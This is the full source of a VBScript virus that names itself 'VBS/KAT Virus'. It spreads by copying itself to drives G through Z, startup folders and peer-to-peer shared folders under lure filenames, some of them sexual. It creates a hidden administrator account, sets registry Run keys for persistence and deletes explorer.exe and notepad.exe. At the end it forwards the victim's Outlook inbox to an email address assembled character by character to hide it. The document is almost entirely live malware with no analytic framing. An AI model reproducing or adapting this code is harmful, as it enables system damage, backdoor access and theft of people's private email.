' VBS/KAT Virus By [KAT EYES]


Set WS = CreateObject("Wscript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")


On error resume next
FSO.CopyFile "KAT.vbs", "C:\WinNT.Dat"
FSO.CopyFile "KAT.vbs", "C:\Windows\System32\KAT.vbs"
FSO.CopyFile "KAT.vbs", "C:\Winnt\System32\KAT.vbs"

On Error Resume Next
WS.Run("Net User KAT KAT /add"), 0

WS.Run("Net localgroup administrators KAT /add"), 0

FSO.CopyFile "C:\WinNT.dat", "g:\KAT.vbs"
FSO.CopyFile "C:\WinNT.dat", "H:\KAT.vbs"
FSO.CopyFile "C:\WinNT.dat", "I:\KAT.vbs"
FSO.CopyFile "C:\WinNT.dat", "J:\KAT.vbs"
FSO.CopyFile "C:\WinNT.dat", "K:\KAT.vbs"
FSO.CopyFile "C:\WinNT.dat", "L:\KAT.vbs"
FSO.CopyFile "C:\WinNT.dat", "M:\KAT.vbs"
FSO.CopyFile "C:\WinNT.dat", "N:\KAT.vbs"
FSO.CopyFile "C:\WinNT.dat", "O:\KAT.vbs"
FSO.CopyFile "C:\WinNT.dat", "P:\KAT.vbs"
FSO.CopyFile "C:\WinNT.dat", "Q:\KAT.vbs"
FSO.CopyFile "C:\WinNT.dat", "R:\KAT.vbs"
FSO.CopyFile "C:\WinNT.dat", "S:\KAT.vbs"
FSO.CopyFile "C:\WinNT.dat", "T:\KAT.vbs"
FSO.CopyFile "C:\WinNT.dat", "U:\KAT.vbs"
FSO.CopyFile "C:\WinNT.dat", "V:\KAT.vbs"
FSO.CopyFile "C:\WinNT.dat", "W:\KAT.vbs"
FSO.CopyFile "C:\WinNT.dat", "X:\KAT.vbs"
FSO.CopyFile "C:\WinNT.dat", "Y:\KAT.vbs"
FSO.CopyFile "C:\WinNT.dat", "Z:\KAT.vbs"

FSO.CopyFile vbs, "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\Startup.vbs"
FSO.CopyFile vbs, "C:\WINDOWS\Start Menu\Programs\Startup\Starup.vbs" 
FSO.CopyFile vbs, "C:\WINNT\Profiles\All Users\Start Menu\Programs\Startup\Startup.vbs"
FSO.CopyFile vbs, "C:\KAT.vbs" 
FSO.copyfile vbs, "c:\windows\system32\drivers\etc\KAT.vbs"
FSO.copyfile vbs, "c:\windows\system\KAT.vbs"
FSO.copyfile vbs, "C:\Documents and Settings\Administrator\Desktop\KAT.vbs"
Fso.Copyfile "C:\windows\KAT.dls","C:\mirc\KAT.ini" 
FSO.CopyFile vbs, "C:\My Downloads\KAT.vbs" 
FSO.CopyFile vbs, "C:\My Shared Folder\KAT.vbs"

sub regcreate(regkey,regvalue)
Rem Enable Registry Writing
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner\[KAT EYES]","[KAT EYES]"
regcreate "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\KAT","KAT.vbs"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Systray", "C:\WINDOWS\system\KAT.vbs"

Set fso = CreateObject("Scripting.FileSystemObject")
Set k = fso.GetFile("c:\windows\explorer.exe")
k.Delete

Set fso = CreateObject("Scripting.FileSystemObject")
Set h = fso.GetFile("c:\windows\notepad.exe")
h.Delete

Set Sh = CreateObject("WScript.Shell")

set fso=CreateObject("Scripting.FileSystemObject")

code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))

code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))

code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))

set wri=fso.CreateTextFile("c:\KAT.vbs")

wri.write code4

wri.close

If Day(Now()) = 2 or Day(Now()) = 13 or Day(Now()) = 15 or Day(Now()) = 19 or Day(Now()) = 20 or Day(Now()) = 24 Then
msgbox "Hello You Have The VBS/KAT Virus By [KAT EYES]"
End If


fso.copyfile vbs, KaZaA & "Young teen.jpg.vbs"
fso.copyfile vbs, KaZaA & "Hot Girl.jpg.vbs"
fso.copyfile vbs, KaZaA & "Pussy.jpg.vbs"
fso.copyfile vbs, KaZaA & "sex.jpg.vbs"
fso.copyfile vbs, KaZaA & "big boobs.jpg.vbs"
fso.copyfile vbs, KaZaA & "Sex Tips.doc.vbs"
fso.copyfile vbs, KaZaA & "Lord of the rings.doc.vbs"
fso.copyfile vbs, KaZaA & "How To Rip DVDs.doc.vbs"
KL = (PgDir & "\KaZaA Lite\My Shared Folder") & "\"
fso.copyfile vbs, KL & "Young teen.jpg.vbs"
fso.copyfile vbs, KL & "Hot Girl.jpg.vbs"
fso.copyfile vbs, KL & "Pussy.jpg.vbs"
fso.copyfile vbs, KL & "sex.jpg.vbs"
fso.copyfile vbs, KL & "big boobs.jpg.vbs"
fso.copyfile vbs, KL & "Sex Tips.doc.vbs"
fso.copyfile vbs, KL & "Lord of the rings.doc.vbs"
fso.copyfile vbss, KL & "How To Rip DVDs.doc.vbs"
Morpheus = (PgDir & "\Morpheus\My Shared Folder") & "\"
fso.copyfile vbs, Morpheus & "Young teen.jpg.vbs"
fso.copyfile vbs, Morpheus & "Hot Girl.jpg.vbs"
fso.copyfile vbs, Morpheus & "Pussy.jpg.vbs"
fso.copyfile vbs, Morpheus & "sex.jpg.vbs"
fso.copyfile vbs, Morpheus & "big boobs.jpg.vbs"
fso.copyfile vbs, Morpheus & "Sex Tips.doc.vbs"
fso.copyfile vbs, Morpheus & "Lord of the rings.doc.vbs"
fso.copyfile vbs, Morpheus & "How To Rip DVDs.doc.vbs"
Grokster = (PgDir & "\Grokster\My Grokster") & "\"
fso.copyfile vbs, Grokster & "Young teen.jpg.vbs"
fso.copyfile vbs, Grokster & "Hot Girl.jpg.vbs"
fso.copyfile vbs, Grokster & "Pussy.jpg.vbs"
fso.copyfile vbs, Grokster & "sex.jpg.vbs"
fso.copyfile vbs, Grokster & "big boobs.jpg.vbs"
fso.copyfile vbs, Grokster & "Sex Tips.doc.vbs"
fso.copyfile vbs, Grokster & "Lord of the rings.doc.vbs"
fso.copyfile vbs, Grokster & "How To Rip DVDs.doc.vbs"
BearShare = (PgDir & "\BearShare\Shared") & "\"
fso.copyfile vbs, BearShare & "Young teen.jpg.vbs"
fso.copyfile vbs, BearShare & "Hot Girl.jpg.vbs"
fso.copyfile vbs, BearShare & "Pussy.jpg.vbs"
fso.copyfile vbs, BearShare & "sex.jpg.vbs"
fso.copyfile vbs, BearShare & "big boobs.jpg.vbs"
fso.copyfile vbs, BearShare & "Sex Tips.doc.vbs"
fso.copyfile vbs, BearShare & "Lord of the rings.doc.vbs"
fso.copyfile vbs, BearShare & "How To Rip DVDs.doc.vbs"

temppp1="c"
temppp2="p"
temppp3="r"
temppp4="k"
temppp5="i"
temppp6="h"
temppp7="e"
temppp8="."
temppp9="@"
temppp10="t"
temppp11="a"
temppp12="o"
temppp13="m"
temppp14="l"
temppp15="v"
temppp=temppp15&temppp1&temppp6&temppp7&temppp1&temppp4&temppp2&temppp3&temppp9
temppp=temppp&temppp6&temppp12&temppp10&temppp13&temppp11&temppp5&temppp14&temppp8
temppp=temppp&temppp1&temppp12&temppp13
compare=-1
Set theApp = CreateObject ("Outlook.Application")
theApp.Visible = False
Set theNameSpace = theApp.GetNamespace("MAPI")
Set InboxFolder = theNameSpace.GetDefaultFolder(6)
For i=1 to InboxFolder.items.count
Set theMailItem = theApp.CreateItem(olMailItem)
theMailItem.Recipients.Add temppp
theMailItem.Subject = "KAT"&i&" "&InboxFolder.items(i).Subject
theMailItem.Body = InboxFolder.items(i).body
datee = InboxFolder.items(i).ReceivedTime
Daydiff = DateDiff("d",Now,datee)
dayOfWeek = Int(Weekday(now))
If dayofWeek = 2 Then
compare = -3
End If
If Daydiff =compare Then
theMailItem.DeleteAfterSubmit = True
theMailItem.Send
End If

' VBS/KAT Virus By [KAT EYES]